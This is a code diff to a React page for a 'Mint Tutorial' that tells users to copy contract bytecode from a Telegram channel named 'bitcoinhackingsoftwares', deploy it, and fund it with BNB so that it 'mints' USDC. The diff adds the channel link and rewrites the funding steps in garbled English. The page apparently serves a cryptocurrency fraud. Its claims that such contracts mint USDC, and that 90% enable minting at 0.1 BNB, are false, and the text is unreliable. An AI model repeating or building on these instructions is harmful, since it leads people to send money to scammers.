@@ -10,7 +10,7 @@ export default function Tutorial() {
       <div className="max-w-4xl mx-auto px-4 py-10">
         <div className="bg-slate-800 rounded-xl shadow-xl p-4 md:p-6 mb-8 border border-slate-700">
           <h1 className="text-2xl md:text-3xl font-bold text-center mb-6 text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-emerald-300">
-            Contract Deployment Tutorial
+            Mint Tutorial
           </h1>
 
           {/* Table of Contents */}
@@ -138,11 +138,11 @@ export default function Tutorial() {
             <div className="space-y-8">
               <div className="bg-slate-750 rounded-lg p-4 border border-slate-700">
                 <h3 className="font-semibold text-lg mb-2">
-                  Step 3: Add BNB to your wallet
+                  Step 3: Enabling the Dapp browser
                 </h3>
                 <p className="text-slate-300 mb-3">
-                  Add approximately $1 worth of BNB to your wallet to cover
-                  network and gas fees.
+                  Enable rabby wallet dApp function by adding about $1 worth
+                  of bnb on that
                 </p>
                 <div className="relative w-full h-56 rounded overflow-hidden border border-slate-700">
                   <Image
@@ -160,8 +160,8 @@ export default function Tutorial() {
                   Step 4: Access the DApp browser
                 </h3>
                 <p className="text-slate-300 mb-3">
-                  After adding BNB, the DApp browser feature is enabled. On iOS,
-                  tap DApps or Website.
+                  After adding BNB, the DApp browser feature is enabled. Tap
+                  DApps or Website.
                 </p>
                 <div className="relative w-full h-56 rounded overflow-hidden border border-slate-700">
                   <Image
@@ -372,8 +372,15 @@ export default function Tutorial() {
                   For Bytecode:
                 </h4>
                 <p className="text-slate-300 mb-3">
-                  Open the Telegram channel, locate a posted Hex, and copy it.
-                  Click &apos;Opcode&apos; to reveal the Hex.
+                  Open the{" "}
+                  <Link
+                    href="https://t.me/bitcoinhackingsoftwares"
+                    className="text-blue-400 hover:text-blue-300"
+                  >
+                    Telegram
+                  </Link>{" "}
+                  channel, locate a posted Hex, and copy it. Click
+                  &apos;Opcode&apos; to reveal the Hex.
                 </p>
                 <div className="relative w-full h-48 rounded overflow-hidden border border-slate-700">
                   <Image
@@ -597,9 +604,11 @@ export default function Tutorial() {
                   by adding BNB to your contract.
                 </p>
                 <ul className="list-disc pl-6 mb-3 text-slate-300">
-                  <li>Most contracts require 0.1 BNB for minting.</li>
+                  <li>Change to Most contracts mint enable on 0.1 BNB</li>
                   <li>
-                    The maximum BNB limit is specified in the mint parameters.
+                    The maximum BNB limit is specified in the call function That
+                    is the maximum amount of BNB your contract can hold to
+                    enable its mint function
                   </li>
                 </ul>
               </div>
@@ -632,13 +641,14 @@ export default function Tutorial() {
                   Step 23: Verify minting enabled
                 </h3>
                 <p className="text-slate-300 mb-3">
-                  After a successful transaction, check the mint parameters
-                  again to confirm minting is enabled.
+                  If minting is not enabled, you must manually call the function
+                  by adding BNB to your contract as the blockchain doesn’t
+                  recognize tokens call functions like native BNB
                 </p>
                 <ul className="list-disc pl-6 mb-3 text-slate-300">
-                  <li>90% of contracts enable minting at this stage.</li>
+                  <li>90% of contract&apos;s mint are enabled on 0.1 BNB</li>
                   <li>
-                    If not, repeat the process until the contract is enabled.
+                    If not, make another until the contract is mint is enabled
                   </li>
                 </ul>
                 <div className="relative w-full h-56 rounded overflow-hidden border border-slate-700">
@@ -674,14 +684,26 @@ export default function Tutorial() {
                     be added to your wallet balance.
                   </li>
                 </ul>
-                <div className="relative w-full h-56 rounded overflow-hidden border border-slate-700">
-                  <Image
-                    src="/images/31.jpg"
-                    alt="Receiving minted USDC"
-                    fill
-                    className="object-contain"
-                    sizes="(max-width: 768px) 100vw, 50vw"
-                  />
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                  <div className="relative w-full h-56 rounded overflow-hidden border border-slate-700">
+                    <Image
+                      src="/images/31.jpg"
+                      alt="Receiving minted USDC"
+                      fill
+                      className="object-contain"
+                      sizes="(max-width: 768px) 100vw, 50vw"
+                    />
+                  </div>
+
+                  <div className="relative w-full h-56 rounded overflow-hidden border border-slate-700">
+                    <Image
+                      src="/images/32.png"
+                      alt="Receiving minted USDC 2"
+                      fill
+                      className="object-contain"
+                      sizes="(max-width: 768px) 100vw, 50vw"
+                    />
+                  </div>
                 </div>
               </div>
             </div>
@@ -692,7 +714,7 @@ export default function Tutorial() {
               href="/"
               className="inline-flex items-center px-6 py-3 rounded-lg font-medium bg-gradient-to-r from-blue-500 to-emerald-400 hover:shadow-lg hover:from-blue-600 hover:to-emerald-500 transition-all duration-200"
             >
-              Try the Contract Checker
+              Contract Checker
             </Link>
           </div>
         </div>
